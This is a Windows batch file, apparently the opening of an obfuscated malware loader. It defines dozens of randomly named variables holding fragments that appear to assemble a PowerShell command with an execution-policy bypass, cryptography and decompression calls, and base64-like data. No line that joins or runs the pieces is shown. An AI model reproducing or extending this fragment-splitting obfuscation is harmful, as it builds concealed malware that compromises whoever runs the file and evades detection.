@echo off
set "IaXAwWxrSn=V = "
set "xGgebNQoiX=gnir"
set "FLzadEjpqZ=stem"
set "avGlmKYpnf=;$jT"
set "oDDIsoZNUB=ddin"
set "DXRzArSxZQ=[Sys"
set "ppfLinCJZn=ocnx"
set "mbPiWBhxOt=vert"
set "tWyaExRwYY=join"
set "idmWOAvVLp=tnV "
set "GbVWswtpVd=CmMo"
set "qKXJmGZJZk=2Q+X"
set "aPujoppxCB=BC;$"
set "SvsuyrJfft=tS46"
set "IfdDZugAyM=Yw, "
set "WeJznsoLJx=wfBW"
set "fXkdldePLY=e = "
set "gKCELQRVZb=rans"
set "trGDqkXMGe=morF"
set "sPTEFXzLBw=ress"
set "kjZhvmldvG=bypa"
set "YweymDVvCG=tem."
set "VOqIcyWChh=-1.."
set "cjfjglFqpe=.Dis"
set "eVoXYHRQvu=Disp"
set "vANXZRzRlN=tem."
set "lFCRhNvbdC=d;$l"
set "KSyzWfhJnE=CmMo"
set "UwlCpRKZde=157K"
set "VGLZtCJUEg=znSk"
set "nXZVEjDBio=[Sys"
set "fNkKdimZBE=::('"
set "HODTBVNxdh=rofi"
set "uWZQOElDiq=stem"
set "uYWuZoDveG=Star"
set "iOotJsJbPo=:('g"
set "flmBQXhVzI= = N"
set "wJMPZUnKzH=ypto"
set "uhJFIofzSK=:: '"
set "RqwWPGGhFq=);$e"
set "zSiRbkqhKR=lBlo"
set "abbYNzLgQt=mory"
set "BGzaqhbphw=]::C"
set "JUoiyxSuWM=ose("
